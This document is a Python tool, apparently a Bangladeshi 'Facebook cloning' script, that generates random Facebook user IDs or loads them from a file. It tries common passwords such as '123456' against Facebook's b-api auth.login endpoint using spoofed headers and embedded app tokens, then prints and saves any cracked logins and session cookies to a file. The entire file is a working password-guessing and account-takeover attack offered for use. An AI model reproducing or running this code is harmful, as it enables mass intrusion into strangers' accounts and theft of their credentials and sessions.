import os, sys, re, time, json, random, requests
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as ThreadPool

#--- [ COLORS ] ---#
G = '\033[1;92m' 
Y = '\033[1;93m' 
W = '\033[1;97m' 
R = '\033[1;91m'
S = '\033[1;96m'

loop, oks, id = 0, [], []

#--- [ 100% ORIGINAL USER AGENTS ] ---#
ua_list = [
    "Mozilla/5.0 (Linux; Android 12; 2201116PG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Infinix X688B)",
    "Mozilla/5.0 (Linux; Android 8.1.0; ASUS_Z01QD) Chrome/72.0.3626.76 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) Chrome/63.0.3239.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Vivo Y91C) Chrome/98.0.4711.185 Mobile Safari/537.36",
    "Mozilla/5.0 (Series40; Nokia2000/11.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.36"
]

#--- [ BANNER ] ---#
def logo():
    os.system("clear")
    print(f"""{G}
 ▄▄       ▄▄  ▄▄▄▄▄▄▄▄▄▄▄          ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░▌     ▐░░▌▐░░░░░░░░░░░▌        ▐░▌       ▐░▌▐░░░░░░░░░░░▌
▐░▌░▌   ▐░▐░▌▐░█▀▀▀▀▀▀▀█░▌        ▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌
▐░▌▐░▌ ▐░▌▐░▌▐░▌       ▐░▌        ▐░▌       ▐░▌▐░▌       ▐░▌
▐░▌ ▐░▐░▌ ▐░▌▐░█▄▄▄▄▄▄▄█░▌        ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌
▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌        ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
{W}━━━━━━━━━━━━━━━━(SHAHIN BIN AHMED)━━━━━━━━━━━━━━━━
{G}[•] AUTHOR     : SHAHIN BIN AHMED
{G}[•] METHOD     : M2 DYNAMIC (UPGRADED)
{G}[•] TARGET     : 2010 SPECIAL (1000016)
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

#--- [ 2010 UID GENERATOR ] ---#
def random_uid_generator():
    logo()
    print(f" {S}[•] TARGETING 2010 SERIES: 1000016XXXXXXX")
    limit = int(input(f" {G}[•] HOW MANY IDS TO SCAN? : {W}"))
    for _ in range(limit):
        # আপনার স্পেশাল ২০১০ লজিক
        uid = "1000016" + str(random.randint(1111111, 9999999))
        id.append(uid)
    start_cloning()

#--- [ CLONING ENGINE ] ---#
def start_cloning():
    logo()
    total = len(id)
    print(f" {G}[•] TOTAL IDS : {W}{total}")
    print(f" {G}[•] CRACKING STARTING... (USE AIRPLANE MODE)")
    print(f" {W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    with ThreadPool(max_workers=35) as engine:
        for uid in id:
            # আপনার সেই ৪টি গোল্ডেন পাসওয়ার্ড
            pws = ['123456', '1234567', '12345678', '123456789']
            engine.submit(crack_engine, uid, pws, total)

#--- [ UPGRADED M2 DYNAMIC ENGINE ] ---#
def crack_engine(uid, pws, limit):
    global loop, oks
    ua = random.choice(ua_list)
    
    for pw in pws:
        session = requests.Session()
        # ফেসবুকের সিকিউরিটি বাইপাস করার ডাইনামিক হেডার
        headers = {
            'x-fb-connection-bandwidth': str(random.randint(2000000, 30000000)),
            'x-fb-sim-hni': str(random.randint(20000, 40000)),
            'x-fb-net-hni': str(random.randint(20000, 40000)),
            'x-fb-connection-quality': 'EXCELLENT',
            'x-fb-connection-type': 'WIFI',
            'user-agent': ua,
            'content-type': 'application/x-www-form-urlencoded',
            'x-fb-http-engine': 'Liger',
            'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        }

        params = {
            'email': uid, 'password': pw,
            'credentials_type': 'password', 'format': 'json',
            'method': 'auth.login', 'api_key': '882a8490361da98702bf97a021ddc14d',
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'sig': '62f8ce9f74b12f84c123cc23437a4a32'
        }

        try:
            # b-api ব্যবহার করে সরাসরি রিকোয়েস্ট (mbasic এর চেয়ে অনেক গুণ শক্তিশালী)
            res = session.post('https://b-api.facebook.com/method/auth.login', data=params, headers=headers).json()
            
            if 'session_key' in res:
                cookie = ";".join([str(key)+"="+str(value) for key, value in session.cookies.get_dict().items()])
                print(f'\n{G}[SHAHIN-OK] {uid} | {pw} | 2010{W}')
                print(f'{S}[COOKIE] {cookie}{W}\n')
                oks.append(uid)
                open('/sdcard/SHAHIN-OK.txt', 'a').write(f'{uid}|{pw}|{cookie}\n')
                break
            elif 'checkpoint' in str(res):
                break
        except:
            time.sleep(1)
            
    loop += 1
    sys.stdout.write(f'\r {S}[SHAHIN-M2]-[{loop}/{limit}]-[OK-{len(oks)}] '); sys.stdout.flush()

#--- [ MAIN MENU ] ---#
def Main():
    logo()
    print(f" {G}[01]{W} RANDOM UID CLONE (2010 SPECIAL)")
    print(f" {G}[02]{W} FILE DUMP CLONE (LOCAL FILE)")
    print(f" {G}[00]{W} EXIT")
    print(f" {W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    opt = input(f" {W}[•] CHOOSE OPTION : {G}")
    
    if opt == "1" or opt == "01":
        random_uid_generator()
    elif opt == "2" or opt == "02":
        file = input(f" {W}[+] ENTER FILE PATH : {G}")
        try:
            for x in open(file, 'r').read().splitlines():
                id.append(x)
            start_cloning()
        except: print(" [!] FILE NOT FOUND"); time.sleep(2); Main()
    else: exit()

if __name__ == "__main__":
    Main()
